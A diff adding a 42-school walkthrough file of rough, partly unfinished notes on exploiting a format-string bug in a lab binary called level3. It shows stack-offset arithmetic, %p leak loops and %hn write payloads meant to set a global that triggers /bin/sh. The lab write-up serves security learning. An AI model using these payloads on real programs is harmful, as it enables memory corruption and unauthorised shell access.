@@ -1,0 +1,58 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/04 18:51:42 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/04 18:55:25 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+The executable uses a user-provided format string.
+
+It then checks a global variable to decide if it should launch '/bin/sh'
+
+Get 
+
+
+
+
+(0xbffff660 - 0xbffff500) / 4 (88) -> 0xbffff6e8 -> 0x08049818 ~= 0x0804988c
+(0xbffff740 - 0xbffff500) / 4 (145) -> 0xbffff71c (135) -> 0x08048525 ~= 0x0804988c
+
+1
+2
+3
+
+%80$p %80$p %81$p %82$p %83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p %95$p %96$p %97$p %98$p %99$p
+
+%88$n -> writes 0 to 0xbffff6e8 NO IT FUCKING DONT
+
+
+
+0x6e5c3833 0x8048268  
+
+find any pointer containing another ptr close to what we want
+
+for i in {0..400} ; do echo -n $i ": " ; echo "%$i\$p" | ./level3 ; echo "%$i\$.4s" | ./level3 | hd ; done | grep -B 1 "04 08 0a"
+
+check if no segfault when modified
+
+echo "%145\$p %145\$.4s %512d %145\$hn -%145\$.4s-" | ./level3 | hd
+
+get the chars we need to get the address of m
+
+0x988c -> 39052
+echo "%39052d%145\$hn%145\$.4s" | ./level3 | hd
+
+get the $param of the new pointer
+
+for i in {0..200} ; do echo "%39052d%145\$hn $i: %$i\$p " | ./level3  | xargs ; done
+
+REALIZE THE NEW POINTER DOESN'T GET FUCKING WRITTEN UNTIL THE FUNCTION RETURNS FOR SOME FUCKING REASON
+
+REALIZE THE STRING IS SOMEHOW WRITTEN ON THE FUCKING STACK
+
+USE THE printf format string to store pointer
